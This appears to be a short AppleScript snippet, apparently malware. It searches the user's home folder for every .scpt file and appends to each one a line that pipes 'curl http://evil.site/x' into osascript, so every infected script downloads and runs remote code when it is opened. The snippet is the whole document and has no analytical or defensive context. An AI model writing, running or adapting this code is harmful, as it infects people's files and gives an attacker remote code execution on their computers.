-- Search for AppleScript files and append a payload

set homePath to POSIX path of (path to home folder)
set scptFiles to paragraphs of (do shell script "find " & homePath & " -name '*.scpt' -type f")

repeat with f in scptFiles
	do shell script "echo 'do shell script \"curl http://evil.site/x | osascript -\"' >> " & quoted form of f
end repeat
